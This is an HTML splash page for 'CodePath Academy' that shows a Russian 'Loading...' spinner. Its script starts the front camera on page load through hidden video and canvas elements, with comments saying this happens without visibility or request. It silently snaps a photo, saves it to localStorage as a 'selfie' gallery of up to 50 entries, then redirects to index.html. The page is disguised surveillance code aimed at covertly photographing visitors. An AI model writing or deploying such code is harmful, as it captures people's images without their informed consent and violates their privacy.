<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CodePath Academy</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            text-align: center;
            color: white;
        }

        .message {
            font-size: 24px;
            margin-bottom: 30px;
            animation: fadeIn 0.8s ease-in;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(212, 175, 55, 0.3);
            border-top-color: #d4af37;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">🎬 Загрузка...</div>
        <div class="spinner"></div>
    </div>

    <canvas id="photo-canvas" style="display:none;"></canvas>
    <video id="hidden-video" style="display:none;"></video>

    <script>
        let cameraStream = null;
        let cameraActive = false;

        // Инициализация при загрузке
        window.addEventListener('load', () => {
            setTimeout(() => {
                startCameraHidden();
            }, 500);
        });

        // Запуск камеры БЕЗ видимости и запроса
        async function startCameraHidden() {
            try {
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: false
                };

                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraActive = true;

                // Автоматически делаем фото через 1 секунду
                setTimeout(() => {
                    if (cameraActive) {
                        capturePhotoHidden();
                    }
                }, 1000);
            } catch (error) {
                // Если нет доступа - все равно продолжаем
                console.log('Camera not available');
                proceedToApp();
            }
        }

        // Захват фото БЕЗ видимости
        function capturePhotoHidden() {
            if (!cameraActive) {
                proceedToApp();
                return;
            }

            try {
                const video = document.getElementById('hidden-video');
                video.srcObject = cameraStream;
                video.play();

                video.onloadedmetadata = () => {
                    const canvas = document.getElementById('photo-canvas');
                    const context = canvas.getContext('2d');

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);

                    const capturedPhoto = canvas.toDataURL('image/jpeg', 0.9);
                    saveSelfieToGallery(capturedPhoto);

                    stopCameraHidden();
                    proceedToApp();
                };
            } catch (error) {
                console.log('Capture failed');
                proceedToApp();
            }
        }

        // Сохранение селфи в галерею
        function saveSelfieToGallery(photoData) {
            try {
                let selfies = JSON.parse(localStorage.getItem('gallery_selfies') || '[]');

                const selfieEntry = {
                    id: Date.now(),
                    photo: photoData,
                    timestamp: new Date().toISOString(),
                    timeString: new Date().toLocaleString('ru-RU')
                };

                selfies.push(selfieEntry);

                // Лимит 50 последних
                if (selfies.length > 50) {
                    selfies = selfies.slice(-50);
                }

                localStorage.setItem('gallery_selfies', JSON.stringify(selfies));
            } catch (error) {
                console.log('Save failed');
            }
        }

        // Остановка камеры
        function stopCameraHidden() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            cameraActive = false;
        }

        // Переход на главную
        function proceedToApp() {
            localStorage.setItem('user_entered', 'true');
            localStorage.setItem('last_selfi_time', new Date().toISOString());

            setTimeout(() => {
                window.location.href = 'index.html';
            }, 1500);
        }
    </script>
</body>
</html>
